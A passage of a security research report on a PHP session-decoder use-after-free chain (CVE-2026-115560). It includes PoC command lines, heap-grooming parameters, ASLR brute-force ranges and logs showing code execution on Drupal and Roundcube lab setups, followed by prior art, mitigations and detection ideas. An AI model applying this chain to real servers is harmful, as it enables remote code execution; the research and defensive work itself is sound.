Cold-start drift (`0x8c875` / `0x9e875`) is corrected by re-measurement; the
first fire on the cold delta crashes after `spray-done` with no proof, the second
lands.

### 8.5 No-`/proc` final: measured full-window scan

**Claim:** the chain completes without reading `/proc` at fire time, on arm64,
inside the measured 576-slot window.

Brute mode scans `0xFFFF78000000 .. 0xFFFFC0000000` in `0x200000` steps
(576 candidates), with a fresh SID and a `/prime.php` dummy record per attempt,
and derives `carrier = main + delta + DOFF`, `zif = main + lib_delta + zif_off`.

```bash
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18201 --container php2shell-115560-8512 --build 8.5.12 \
  --brute --delta 0x6c019 --lib-delta=-0x3600000 --zif-off 0x535490 --fire-mode 4

python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18200 --container php2shell-115560-8427 --build 8.4.27 \
  --brute --delta 0x6c019 --lib-delta 0x2130000 --zif-off 0x431510 --fire-mode 4
```

| Build | Attempt | Wall time | Winning addresses | Proof |
|---|---|---|---|---|
| 8.5.12 | **351** | **1406 s** | `main=0xffffa3c00000 carrier=0xffffa3c6c02d zif=0xffffa0b35490` | `uid=33` |
| 8.4.27 | **307** | **1238.8 s** | `main=0xffff9e400000 carrier=0xffff9e46c02d zif=0xffffa0961510` | `uid=33` |

Exact-main check (known `main`, no scan): 1 attempt, 1.8 s.

Why it is feasible only on arm64: the container reports
`vm.mmap_rnd_bits = 18`, so the ZendMM `main` chunk has 512 possible 2 MiB
slots; a wrong guess kills only a child and Apache respawns it. Native x86-64
at `mmap_rnd_bits=28` has ~`2^19` slots and is not viable.

### 8.6 Multi-worker prefork and pinning (action D)

**Claim:** the measured geometry is fork-inherited; the chain works on any of 8
children, with and without worker pinning.

Target `127.0.0.1:18206`, container `php2shell-115560-8427-workers`, native
arm64. `workers.conf`: 8 persistent children
(`StartServers/MinSpare/MaxSpare/MaxRequestWorkers/ServerLimit = 8`,
`MaxConnectionsPerChild 0`, `Timeout 120`, `KeepAlive Off`).

```bash
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18206 --container php2shell-115560-8427-workers \
  --build 8.4.27 run
```

Unpinned observed:

```text
[m] magic hits=6 raw-input=4
[m] pid=20 main=0xffffaf000000 lib=0xffffb10f0000 zif=0xffffb1521510
[m] magic=0xffffaf06c82d carrier=0xffffaf06c02d value_string=0xffffaf06c019 delta=0x6c019
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```

`/tmp/dtor_log` shows measure on pid 20 and fire on pid 22 — different children,
same addresses. Full wall time 2.3 s.

Pinning primitive:

```bash
python3 poc/verify_worker_pinning.py --target http://127.0.0.1:18206 --holders 7
```

```text
[1] Control (no holders): 8 distinct PIDs across 16 responses
    [18, 19, 21, 23, 24, 25, 90, 91]
[2] Pinned (7 stalled holders): 1 distinct PID(s) across 12 responses
    [91]
[EVIDENCE] WORKER PINNING REPRODUCED
```

Chain inside the pinned window (`lab-115560/fire_pinned.py`):

```text
[pin] pre-measure worker samples: [24]
[m] pid=24 main=0xffffaf000000 lib=0xffffb10f0000 zif=0xffffb1521510
[m] magic=0xffffaf06c82d carrier=0xffffaf06c02d value_string=0xffffaf06c019 delta=0x6c019
[pin] post-measure worker samples: [135]
[pin] lone free worker pid=135
[f] proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 chain works under worker pinning
```

| Scenario | measure pid | fire pid | main | proof |
|---|---|---|---|---|
| 8 workers, unpinned | 20 | 22 | `0xffffaf000000` | ✅ |
| 8 workers, unpinned harness | 25 | 19 | `0xffffaf000000` | ✅ |
| 8 workers, 7 holders | 24 | 135 | `0xffffaf000000` | ✅ |

**Worker-pairing caveat:** pinning does not preserve the *same PID* across
measure → fire with this driver. `measure()` releases the held child with
`kill -9`; Apache respawns, so the window contains pid 24 for measure and 135
for fire (same slot, different process). The chain still works because the
ZendMM main chunk is created before the fork and inherited with the same base.
For a leak-fed seed no worker has to be killed, and pinning then keeps the same
child. `MaxConnectionsPerChild 0` is required; `MaxConnectionsPerChild 1`
re-execs the child and can change the mapping. Tested on 8 workers, not the
stock prefork default of 150; FPM was not tested.

### 8.7 amd64 / Rosetta (action E)

**Claim:** the chain works on x86-64 userspace when addresses are supplied; the
arch-independent `delta` is unchanged, but `lib − main` and `zif` offsets are
not.

Host is arm64; Docker's amd64 emulation is **Rosetta 2 for Linux**
(`/proc/<pid>/maps` contains `/mnt/rv/[rosetta]`), not a native x86-64 kernel.
Target `127.0.0.1:18207`, `php:8.4.27-apache` (`linux/amd64`).

The unmodified driver's `maps.parse_maps` is arm64-shaped and fails on amd64 for
two parsing reasons:

1. **libphp base**: the first LOAD is `r--p` at offset 0; the executable segment
   starts at `0x157000`, so `lib` must be `0x7ffffe007000`, not the `r-xp` start.
2. **ZendMM main**: the anonymous mapping starts one page before the 2 MiB
   boundary (`0x7ffffc3ff000-0x7ffffc600000`), so the chunk base is
   `0x7ffffc400000`, which the arm64 parser discards.

No driver edit was made; `lab-115560/measure_amd64.py` repeats the same measure
with x86-64-aware parsing and prints explicit `fire` arguments.

```text
[m] pid=316 libphp_base=0x7ffffe007000
[m] main=0x7ffffc400000 (aligned candidate=True)
[m] magic=0x7ffffc46c82d value_string=0x7ffffc46c019 delta=0x6c019 carrier=0x7ffffc46c02d
[m] zif=0x7ffffe471d70 zif_off=0x46ad70
[m] lib-main=0x1c07000
```

Fire:

```bash
python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18207 \
  --container php2shell-115560-amd64 --build 8.4.27 \
  --main 0x7ffffc400000 --delta 0x6c019 \
  --lib 0x7ffffe007000 --zif 0x7ffffe471d70 fire
```

```text
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> var_destroy -> uid=33
```

Control `--bias-zif 0x1000` with the same addresses writes no proof. Measure ran
on pid 86 and fire on pid 131 (`MaxConnectionsPerChild 1`); the fork-inherited
main still makes it work.

**Seed gap:** the Rosetta target is deterministic (six measures, five restarts,
same `main`/`lib`), so its seed gap is effectively **1 candidate**. This does not
generalize: native x86-64 at `mmap_rnd_bits=28` is ~`2^19` candidates. The
driver's `--brute` defaults `0xFFFF78000000..0xFFFFC0000000` (576 slots) are
arm64-shaped and do not cover any `0x7fff...` mapping. 8.5.12 on amd64 was not
tested.

### 8.8 Negative: `__wakeup` / `__unserialize` are not a re-entry

**Claim:** only `__destruct` re-enters the freed chain; the delayed magic calls
are locked.

Payloads: the proven carrier with the tail object replaced by
`CacheWakeup` (`__wakeup`) or `CacheWakeupU` (`__unserialize`), at `nondup` and
`dup` placements. Targets `:18208` / `:18209` (`cleanup=Off` diagnostics).

| Build | kind | placement | magic invoked | nested `R:1020` | proof |
|---|---|---|---|---|---|
| 8.4.27 | `__wakeup` | nondup | yes | `boolean` (false) | none |
| 8.4.27 | `__wakeup` | dup | yes | `boolean` | none |
| 8.4.27 | `__unserialize` | nondup | yes | `boolean` | none |
| 8.4.27 | `__unserialize` | dup | yes | `boolean` | none |
| 8.5.12 | `__wakeup` | nondup/dup | yes | `boolean` | none |
| 8.5.12 | `__unserialize` | nondup/dup | yes | `boolean` | none |

Observed 8.4.27:

```text
[f] wakeup_log='wakeup m=4 pid=22\nspray-done\nafter-unserialize type=boolean\nwakeup-end\nwakeup-dtor pid=22\nafter-session-start\nshutdown'
[NEGATIVE] no proof: the delayed call did not re-enter the freed var_entries chain
```

Positive control: the same measured carrier/`zif` with the proven `__destruct`
gadget against `/index.php` fired immediately on both builds. So the B′ payloads
were well-formed and the carrier address was correct; only the delayed-call
re-entry fails. This confirms the source-level lock model (§4.1) and is a
**correction** to the earlier "wakeup variant" hypothesis, not a new finding.

---

## 9. Real-application profiles

The gadget survey (`docs/GADGET_SURVEY_115560.md`) found **no stock, default
application** that combines the 115560 handler switch with a qualifying
re-entry destructor. The two halves exist in different applications. Two
profiles were built to test each half against real code:

- **Drupal 11.4.11** — best real re-entry gadget (stock core P5), but the
  handler switch is a non-default config line.
- **Roundcube 1.6.11** — the stock switch exists only for the `db`/`redis`/
  `memcache` drivers, which read their own store and therefore never decode the
  upload-progress **file**; no stock re-entry gadget. The proven pass is
  plugin-assisted.

### 9.1 Drupal 11.4.11 P5 (gate G1: PASS)

**Chain (all stock Drupal core):**

```text
YamlCacheCollectorDiscovery::__destruct()   core/.../Discovery/YamlCacheCollectorDiscovery.php:64
 -> MenuActiveTrail::destruct()             core/.../Menu/MenuActiveTrail.php:81
 -> CacheCollector::updateCache()           core/.../Cache/CacheCollector.php:234
      $lock_name = $cid . ':' . __CLASS__   :251  -> 8135 B -> 8160-byte alloc (spray)
 -> MemoryBackend::get()                    core/.../Cache/MemoryBackend.php:44
 -> MemoryBackend::prepareItem()            :89
      $prepared->data = unserialize($prepared->data)  :99  <-- re-entry, no allowlist
```

**Delivery:** the real 115560 session decoder (upload-progress record under
`php_serialize`; app switches to `php`; `session_start()`). No application
`unserialize()` sink outside the gadget.

**Heap shaping:** `cid_len=8102`, `nk=65` string-keyed `keysToPersist`
entries, `npad=4` late 8160-byte strings. `var_entries` is 8160 bytes (two
pages). The `$cid . ':' . __CLASS__` lock name is 8135 bytes →
`24 + 8135 + 1 = 8160`, the same size class; `$cid[0:8]` holds the forged
`zval *`, which lands at chunk+24 = `data[1]`.

ZendMM large allocations use **best-fit** and take the lowest exact two-page
free run. After `var_destroy` frees the chain chunk, lower exact-two-page runs
still exist, so a single lock-name allocation does not reach it. Two
attacker-controlled, persistent allocations fix the page map:

- `npad=4`: four 8135-byte strings in a property parsed **last**
  (`directories` after `yamlCacheCollector`), occupying lower runs free at
  `var_destroy` entry.
- `nk=65`: 65 string-keyed `keysToPersist`/`storage` entries. Before the lock
  name is built, `updateCache()` fills `$data`; at 65 string keys its hashtable
  is a two-page table and stays live, consuming the last lower exact-two-page
  run. The lock name then takes the freed `var_entries` chunk.

Integer keys do not work: they produce a packed array whose storage is small and
never a two-page hashtable. With `nk<=64` the table is below two pages (or is
released) and the spray misses; `nk>=65` moves the lock name onto the freed
chain chunk. GDB confirmation on 8.4.27 CLI (`probe_npad.py`, `probe_map3.py`):

```text
npad=4, nk=65: FREED 0xfffff5f17000
               ALLOC emalloc size=8128 -> 0xfffff5f17000
               ALLOC erealloc size=8167 -> 0xfffff5f17000
               SUCCESS
```

**Direct results (stock ZendMM, fixed benign command):**

| build | container / port | main | zif | delta | proof |
|---|---|---|---|---|---|
| 8.4.27 | `php2shell-115560-drupal-8427` / `18300` | `0xffff9ee00000` | `0xffffa1401510` | `0x7b019` | `uid=33(www-data)` |
| 8.5.12 | `php2shell-115560-drupal-8512` / `18301` | `0xffff82000000` | `0xffff7ef35490` | `0x7b019` | `uid=33(www-data)` |

8.4.27 observed:

```text
[m] measure payload_len=69819 cid_len=8102 nk=65 npad=4
[m] pid=2872 main=0xffff9ee00000 lib=0xffffa0fd0000 zif=0xffffa1401510
[m] magic=0xffff9ee7b82d carrier=0xffff9ee7b02d value_string=0xffff9ee7b019 delta=0x7b019
[f] carrier=0xffff9ee7b02d zval_ptr=0xffff9ee7b12d zif=0xffffa1401510
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> Drupal P5 -> var_destroy -> uid=33
```

**ASAN through the session decoder:** `heap-use-after-free`, READ of size 8 at
`var_unserializer.c:906`, through `var_destroy` →
`ps_srlzr_decode_php` → `php_session_decode` → `php_session_initialize` →
`php_session_start`; the freed region is the 8160-byte chunk (full trace in
§4.5).

**Autoload fidelity:** `lab-drupal/vd_nopreload.php` (no `class_exists()`
preload) still reaches `uid=33`:

```bash
python3 poc/verify_115560_drupal.py --target 127.0.0.1:18300 \
  --container php2shell-115560-drupal-8427 --build 8.4.27 \
  --main 0xffff9ee00000 --delta 0x7b019 --zif 0xffffa1401510 \
  --path /vd_nopreload.php fire
```

The stock Composer autoloader resolves the P5 classes during the normal decode;
the upload-progress hook's own `incomplete_classes_only` decode
(`session.c:970-975`) does not block the later app-level decode because the app
decode is outside `in_rfc1867_update`. This removes a fidelity objection.

**`cleanup=On` race (default profile, port 18302):** PASS on 8.4.27. The race
container uses `lab-drupal/vdlab/apache-race.conf` (4/8 prefork children,
`MaxConnectionsPerChild=1`) and `vd_seed.php` persists
`seed_d = "|" + valid a:1018 dummy` under `php_serialize`, so the file begins
`a:1:{s:6:"seed_d";s:N:"|a:1018:{...}`. The consumer's `php` decoder parses the
dummy as record #1 and the streamed progress payload as record #2.

```bash
python3 poc/verify_115560_drupal.py \
  --target 127.0.0.1:18302 \
  --container php2shell-115560-drupal-8427-race \
  --build 8.4.27 --settle 0.7 --nchunks 8 --delay 0.6 race
```

```text
[m] race measure attempt 1/3
[m] race pid=970 main=0xffff9d000000 lib=0xffff9f040000 zif=0xffff9f471510
[m] race carrier=0xffff9d07b889 value_string=0xffff9d07b875 delta=0x7b875
[f] race payload_len=69819 nk=65 npad=4
[f] proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] cleanup=On race -> Drupal P5 -> var_destroy -> uid=33
```

**Controls (both keep `nk=65,npad=4`):**

| Control | Result |
|---|---|
| `--cid-len 100` (no 8160 spray) | payload 45810; HTTP 200; no proof; no terminal |
| `--bias-zif 0x1000` | `zif=0xffffa1402510`; no proof; no terminal |
| race `--settle 6.0` | hold exists but magic scan finds no raw input; rc=2; no proof |
| race `--no-seed` | measure finds payload (`delta=0x79037`), fire HTTP 200; no proof |
| race `--bias-zif 0x1000` | measure succeeds, fire dies without proof |

**Caveat:** needs the non-default
`session.storage.options.serialize_handler: php` line. This is a
**config-gated** profile, not default Drupal. Removing that line removes the
115560 precondition for this gadget.

### 9.2 Roundcube 1.6.11 (gate G2: PASS for plugin-assisted profile)

**Load order (empirical):** plugin top-level code runs in `rcmail::startup()`
before `session_init()` (`program/include/rcmail.php:111` loads plugins, `:116`
calls `session_init()`). The plugin's top-level code `include`s before
`session_start()`, so its classes are available during the decode.

```text
1793404264.188396 pid=29 plugin-load handler=php_serialize name=PHPSESSID
1793404264.188448 pid=29 handler-switched handler=php
1793404264.188881 pid=29 simple-dtor          <- during session_start decode
1793404264.191581 pid=29 plugin-init task=.*  <- after session_init
proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The destructor runs **before** `plugin-init`, proving the class was available at
decode time.

**Write path:** the upload-progress hook writes `sess_<sid>` under
`php_serialize`; the consumer reads the same file with `session_storage='php'`.
`prime` mode sends a valid `a:1018:{...}` payload to `/prime.php` (no
`session_start`) and dumps the file:

```text
[p] sess_rcprime8427abc:
b'a:1:{s:10294:"upload_progress_|a:1018:{i:0;s:4096:"\x00...'
```

That is the `php_serialize` writer storing the progress key plus the attacker
value; the `php` decoder splits at the first `|`.

**Simple gadget:** progress value `|O:8:"VdSimple":0:{}`; decode instantiates
the class and the destructor runs. Proof `uid=33` on 8.4.27 `:18310` and 8.5.12
`:18311`.

**Terminal (plugin dtor → `@unserialize('R:1020;')` → forged `zif_system`):**
the driver primes the SID (one dummy record), then POSTs the proven
`a:1018:{...}` `CachePurge` payload with the forged carrier key. `?m=4` skips
the dry mid-parse dtor and fires on the real decode-failure `var_destroy` dtor.

| build | main | lib | `zif_system` | delta | spray | proof |
|---|---|---|---|---|---|---|
| 8.4.27 | `0xffffab600000` | `0xffffad780000` | `0xffffadbb1510` | `0x8d9c1` | `3048` | `uid=33` |
| 8.5.12 | `0xffff81c00000` | `0xffff7e600000` | `0xffff7eb35490` | `0x9e9c1` | `8135` | `uid=33` |

Repeat runs were stable (8.4.27 2/2, 8.5.12 2/2 before the final capture; the
captured runs after restart also hit). `response=<none>` on the terminal is
expected; `/tmp/vd` is the proof.

**Roundcube-specific carrier note:** the shared lab driver takes the first magic
hit whose preceding bytes are `a:1018:{i:0;s:4096:"`. Under Roundcube that is
**not** the live carrier: the request-body buffer sits at the old lab delta and
the session file read happens twice more. The Roundcube driver selects hits
whose 17 preceding bytes are `upload_progress_|` and takes the **highest**
candidate. Measure and fire must use **different SIDs**: reusing the measure SID
adds a third progress key and moves the carrier (observed HTTP 200, no proof).

**Controls (negative on both builds):**

| control | 8.4.27 | 8.5.12 |
|---|---|---|
| `--bias-zif 0x1000` | `response=<none>`, no proof | `response=<none>`, no proof |
| `--noswitch` (plugin skips `ini_set`) | HTTP 200, no proof | HTTP 200, no proof |
| `--nogadget` (classes not defined) | HTTP 200, no proof | HTTP 200, no proof |

**Stock db/redis blocker (reproduced, not assumed):** stock Roundcube only calls
`ini_set('session.serialize_handler','php')` inside
`rcube_session::register_session_handler()`
(`program/lib/Roundcube/rcube_session.php:109-116`), which only the
db/redis/memcache/memcached drivers call. Those drivers read their own store, so
the upload-progress **file** record is never decoded. With SQLite
`session_storage='db'`, the DB row held only
`temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a...` — no
`upload_progress` bytes, no dtor, no `/tmp/vd`. `session_storage='php'` reads
the file but does not switch the handler. The two stock options are mutually
exclusive in 1.6.11.

A server-level `session.save_handler=redis` aligned with Roundcube's redis
keyspace is theoretically possible but **was not tested and is not claimed**.
The 8.5.12 service also disables the builtin `array_first` so Roundcube's
polyfill loads; that is a Roundcube/PHP-version incompatibility unrelated to
115560 and does not affect `zif_system`.

**Caveat:** the gadget class is a lab plugin. The terminal proves the
composition through a real Roundcube `session_start()`, not the existence of a
stock Roundcube gadget (the survey found none). This is a
**plugin/custom-code profile**, not a stock chain.

### 9.3 Application-profile summary

| Profile | 115560 precondition | Re-entry gadget | Result | Framing |
|---|---|---|---|---|
| Drupal 11.4.11 P5 | needs non-default `serialize_handler: php` | stock core, self-spraying | `uid=33` direct + race | config-gated |
| Roundcube 1.6.11 | stock switch only in db/redis/memcache drivers (own store, not the progress file) | lab plugin only | `uid=33` simple + terminal | plugin-gated |
| CakePHP 2–5 | stock for `cake`/`database` presets | none found | not tested | open |
| custom Composer app | app calls `ini_set(...,'php')` | any package with the shape | not tested | broadest fallback |

---

## 10. Threat model and deployment realism

### 10.1 Attacker sequence (lab)

1. Send an unauthenticated multipart POST carrying
   `PHP_SESSION_UPLOAD_PROGRESS = "|" + payload` to a page that switches the
   handler to `php` and calls `session_start()`.
2. In the **direct** profile (`cleanup=Off`) that same request is the consumer:
   the progress hook writes the record, then the app decodes it.
3. In the **default** race profile (`cleanup=On`) the record is erased at
   `MULTIPART_EVENT_END`, so step 1 must instead be a slow streaming POST to a
   page that does **not** start the session, and a **second** request with the
   same cookie must reach a switching page inside the ~4.8 s window.
4. The session decoder parses the payload, the destructor re-enters the
   unserializer, and the forged `dtor_obj` runs the fixed command.

The race target needs at least two workers. The direct profile does not.

### 10.2 What the attacker needs to know or guess

| Requirement | Lab value | Real-target difficulty |
|---|---|---|
| Handler config | `php_serialize` + runtime `php` switch | uncommon; app-specific |
| Upload progress | `On` (default) | default, but only useful with the mismatch |
| Re-entry gadget | lab `CachePurge` | rare; no stock default app found |
| Carrier address | measured or brute-forced | arm64 512 slots (feasible); x86-64 2^19 (needs leak) |
| `libphp` base | `lib − main` per build | stable per image, varies per instance on some layouts |
| `zif_system` offset | per build/arch | must match the exact image |

### 10.3 Impact

Code execution as the web user (`uid=33` in these images). The lab deliberately
executes only `id>/tmp/vd 2>&1`; the *capability* is arbitrary command
execution, but no arbitrary-command interface exists in the harness. The forged
call bypasses `disable_functions`, so a hardened `php.ini` is not a control.
The worker is corrupted after the call (empty response), which is a reliability
cost but not a safety property: the command has already run.

### 10.4 Deployment realities

| Environment | Status |
|---|---|
| Apache `mod_php`, arm64 | proven end-to-end (direct, race, multi-worker, no-`/proc`) |
| Apache `mod_php`, amd64/Rosetta | proven with explicit addresses; deterministic layout |
| Native x86-64 | memory-feasible; **not self-contained** at 28-bit randomization |
| PHP-FPM | **not tested**; needs `fastcgi_request_buffering off` at the frontend |
| FrankenPHP / LSAPI | not tested |
| 8.5.12 on amd64 | not tested |
| 150-worker prefork | not run; 8 workers + 149-holder logic expected to scale |

### 10.5 Likelihood

The composition is real but the intersection is rare: a server must be
configured for `php_serialize`, an application must switch to `php` at runtime,
and a loaded class must spray and re-enter `unserialize()`. The advisory calls
the combination "unlikely in practice". The public simple-gadget path is easier
to reach but is blocked by `disable_functions`; this chain's value is precisely
that it survives that hardening and needs no application `unserialize()` sink.

---

## 11. Prior art and novelty (with retraction)

### 11.1 Public prior art

| Work | Date | What it published | Relationship |
|---|---|---|---|
| **ACD421/PHP** `weapons/lab/fa_jammy.sh` | 2026-10-26 | full four-stage composition: upload-progress → session decode → var_destroy → `dtor_obj = zif_system` → `uid=0` on jammy 8.1.2, ASLR on, no gdb, `MaxRequestWorkers 4` | **the exact composition**; our result is a port/engineering delta |
| **ACD421** `zero1_session_gaps/WRITEUP.md` | 2026-10-21 | 115560-class handler mismatch, upload-progress key injection, stock `cleanup=1` slow-upload race on 8.5.12, simple `DeferredWriter` dtor | public pre-auth delivery + cleanup race |
| **ACD421** `zero4`/`zero5` | 2026-10-21/24 | var_destroy re-entry UAF, ASAN, 1018 boundary, `__wakeup`/`__unserialize` under lock, forged `dtor_obj = zif_system`, 8.5.12 session-decode receipt (poisoned file) | public UAF + terminal |
| **B63** | 2026-10-23 | 115560 pre-auth, `php_binary`/`php_serialize`, direct + `cleanup=1` race, simple `FileCache` dtor, `uid=33` on 8.4.27/8.5.12 | simple gadget, no memory corruption |
| **googlesky** | 2026-10-24 | 115560 `uid=33` on `php:8.4.27-apache` in 3.3 s, simple `LabGadget::__destruct` | same class |
| **junaire** | reported locally; **no stable URL re-verified 2026-10-31** | handler mismatch, simple `Logger->cmd` dtor | same class; not relied on |
| **dinosn** | 2026-05-02 | var_destroy re-entry UAF, full RCE on 8.2.12, `/proc/self/maps` + `/proc/self/mem` | app sink + `/proc`, not 115560 |
| **Calif MADBugs** | 2026-05-01 | var_destroy → forged closure → `zif_system`, `/proc` | app sink + `/proc` |
| **mnk-works Chain B** | 2026-10-21 | var_destroy UAF, ASAN; stops at UAF | needs app sink; no full RCE |
| **TheCyberGeek Phase B** | 2026-10-22/25 | UAF → handler overwrite with `zif_system` via `/proc/self/mem`, `disable_functions` bypass | app sink + `/proc` |
| **Qi Deng / ikow Chain B** | 2026-10-21 | var_destroy → `/proc/self/mem` → `zif_system`; handler mismatch + simple dtor | app sink / FPM mismatch |
| **9bie / EDB 52704** | public before 2026-10-21 | pre-auth OOM → fake HashTable `pDestructor = zif_system`; 150 workers; x86-64 + aarch64 | different bug (109618/19); pre-auth `zif_system` public |
| **devploit** | 2026-10-21/30 | 56 profiles, 30 RCE; worker pinning; HTTP heap/libphp leaks; amd64 + aarch64 | different bug; leak-based |
| **umair-aziz025 / EDB 52704** | 2026-10-23 | `PHP_SESSION_UPLOAD_PROGRESS` fake reference, `pDestructor = zif_system`; pinning | different bug |
| **Roundcube CVE-2025-49113** | 2025-06-02 | post-auth `Crypt_GPG_Engine::__destruct` → `proc_open` | not a re-entry, not a session decoder |
| **Roundcube CVE-2026-114724** | 2026-10-22 | `rcube_session::unserialize()` object injection | not a re-entry UAF |

### 11.2 Retraction

The sentence in `docs/RESEARCH_REVIEW_2026-10-30.md` §4.3 — "Nobody has
published the composition where the session decoder itself is the var_destroy
sink" — is **false**. ACD421's `fa_jammy.sh` (2026-10-26) publishes the full
four-stage composition, including no application `unserialize()` sink and
`dtor_obj = zif_system`, and `zero1` (2026-10-21) publishes the 115560-class
pre-auth delivery and the stock `cleanup=1` race. Any framing of the
composition, the forged `dtor_obj`, the handler switch, the cleanup race, the
`disable_functions` bypass, or multi-worker pinning as **new** is retracted.
The corrected `docs/STATUS.md` §2.1 and `docs/NOVELTY_115560_2026-10-31.md`
carry the corrected record.

### 11.3 Defensible narrow delta

What was **not found** in the public record checked on 2026-10-31:

1. the composition on **patched 8.4.27 and 8.5.12**, not 8.1.2;
2. with **default `cleanup=On`** (streaming race) combined with the var_destroy
   terminal, including the two-record seed requirement;
3. on **arm64 with no `/proc` at fire time**, using a full-window carrier search;
4. with the measured **raw-session-input-buffer carrier** and per-build
   constants.

That is an engineering/port result on top of a public composition. It is not a
new vulnerability, not a new primitive, and not a new CVE.

### 11.4 Recommended wording (and what not to say)

Recommended title: **"CVE-2026-115560 as a pre-auth delivery path for the
var_destroy UAF on patched PHP 8.4.27 / 8.5.12."**

Do **not** use: "first", "nobody has", "no public PoC", "novel composition",
"new chain", "new class of attack", "default PHP", "works on any PHP",
"universal", "pre-auth on stock PHP", "new CVE", "0-day", "bypasses the patch",
"no gadget required", "disable_functions bypass is new", "multi-worker/pinning
is new", or "cleanup=On race is new". Each is either false or already public
(`docs/NOVELTY_115560_2026-10-31.md` §5.4).

---

## 12. Defense and mitigations

This section separates **lab-verified behavior** from general advice. It is a
defense note, not a new vulnerability claim.

### 12.1 Verified non-mitigations

| Control | Why it fails here | Evidence |
|---|---|---|
| `disable_functions=system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec` | the forged call is an indirect C call to `zif_system`, not a function-table lookup; the disabled-function stub is never consulted | §8.3: `function_exists('system')===false`, direct `system()` fatal, forged call writes `uid=33` |
| application `unserialize($x, ['allowed_classes'=>false])` and input validation | the sink is `php_session_start()`'s decoder, outside application code | §5.2; `docs/DEFENSE_115560.md` §2.2 |
| a WAF rule aimed only at the var_destroy payload | the public simple-gadget path (`FileCache`, `Logger`, `VdSimple`) executes without any memory corruption | §9.2 simple-gadget proof |
| a hardened `php.ini` alone | handler config and upload progress are the preconditions; `disable_functions` is irrelevant | §8.3 |

### 12.2 Effective mitigations (ordered by directness)

1. **Disable upload progress** — `session.upload_progress.enabled=0`. Removes the
   writer that places attacker bytes in the session file before the app runs.
   Verified negative on `:18202`: no destructor, no `meas_pid`, no proof.
2. **Remove the runtime handler switch** — do not call
   `ini_set('session.serialize_handler','php')` (or pass
   `serialize_handler => php` to `session_start()`) on a server configured for
   `php_serialize`/`php_binary`. Verified negative on `/noswitch.php`: HTTP 200,
   no proof.
3. **Pin the handler with `php_admin_value`** — use
   `php_admin_value[session.serialize_handler] = php_serialize` (or the intended
   handler). `php_admin_value` makes the runtime `ini_set()` fail; `php_value`
   does **not** (the app can still switch). This is the strongest server-side
   control when the application needs a different handler.
4. **Keep one consistent handler** — if the site must use `php_serialize`
   everywhere, remove code paths that switch to `php` for the same session. The
   mismatch is the enabling condition.
5. **Session file isolation** — keep `session.save_path` outside the web root
   and not includable. This does not stop 115560 by itself, but it blocks
   session-file-inclusion variants (Chain A).
6. **Patch tracking for the UAF** — the `var_destroy` bug survives the
   109618/109619 patch (verified on 8.4.26/8.4.27/8.5.12). Treat it as a
   separate memory-safety issue; the 115560 mitigations do not fix it. The
   proposed upstream fix is to hold `BG(serialize_lock)` across
   `i_zval_ptr_dtor()` in `var_destroy()`.

### 12.3 Application-profile notes

- **Drupal 11.4.11:** the stock P5 gadget reaches the terminal only with the
  non-default `session.storage.options.serialize_handler: php` line. Removing
  that line removes the 115560 precondition; the UAF still needs another sink.
- **Roundcube 1.6.11:** stock Roundcube does not combine both halves; the
  `ini_set(...,'php')` exists only in db/redis/memcache drivers, which read
  their own store. A plugin that switches before `session_init()` while
  `session_storage='php'` reads the file reproduces the terminal. A
  server-level redis keyspace alignment is theoretical and untested.

### 12.4 Detection candidates (not validated rules)

These are candidate signals for `detection/`, not tested detections:

- a session file/record containing `upload_progress_` followed by a long
  `a:1018:{...}` array with duplicate `i:99999` keys;
- multipart uploads that keep a progress record alive across requests
  (streaming body + concurrent same-SID request), especially with
  `session.upload_progress.cleanup=On`;
- `session.serialize_handler` changing from `php_serialize` to `php` within a
  request (PHP-level audit hook, if available);
- workers dying during `session_start()` after a progress upload (SIGSEGV) —
  a symptom, not proof of RCE.

### 12.5 Bottom line

`disable_functions` and application `unserialize()` fixes are not sufficient.
The robust controls are to **remove the upload-progress writer** and/or
**remove or pin the runtime handler switch**. Drupal P5 and the Roundcube plugin
profile are config/plugin-gated, not default-app chains.

---

## 13. Limitations and non-claims

### 13.1 Non-claims

- **Not default PHP.** The default `session.serialize_handler` is `php`; 115560
  needs `php_serialize`/`php_binary` configured and an app that switches to
  `php` at runtime. A truly default install is not in the threat model.
- **Not a default application.** No stock, default app was found that combines
  the switch with a re-entry destructor. Drupal needs a config line; Roundcube
  needs a plugin.
- **Not a new composition, primitive, CVE, or technique.** All are public
  (§11).
- **Not native x86-64 general.** The no-`/proc` final is arm64-specific (18-bit
  window); x86-64 (~2^19) needs a leak.
- **Not FPM, FrankenPHP, or LSAPI.** Not tested.
- **Not a remote-ready exploit.** The carrier address must be seeded or
  brute-forced; the lab command is fixed and benign; the worker is corrupted
  after the call.
- **Not arbitrary command in the harness.** The forged string carries
  `id>/tmp/vd 2>&1` only.

### 13.2 Structural ceilings

1. **Gadget scarcity.** The re-entry destructor is rarer than the public simple
   gadget. The survey covered 46,508 PHP files in ~60 trees/packages and found
   no stock app with the exact shape; it cannot prove a negative for unscanned
   plugin ecosystems.
2. **Address seed.** The amplifier needs one external address on patched builds:
   the freed `var_entries` chunk is reusable only when its `data[id]` slot
   contains attacker bytes, and the engine treats those bytes as a pointer. The
   barrier is structural, not a grooming problem (`docs/VAR_DESTROY_UAF.md` §5).
3. **Per-build drift.** `delta`, `lib − main`, and `zif` offsets are per build,
   arch, application, and request shape. Cold-start drift
   (`+0x1e000..0x20000`) requires re-measurement.
4. **Timing.** The `cleanup=On` race needs a multi-second streaming upload and a
   second worker; a target that buffers the whole body or has one worker is out
   of scope.
5. **Worker recycling.** `MaxConnectionsPerChild 0` is required for
   fork-inherited geometry; `MaxConnectionsPerChild 1` can change the mapping
   (though the amd64 run still worked because the main chunk is inherited).

### 13.3 Open problems

- a stock application/plugin with the exact `__destruct` discard shape;
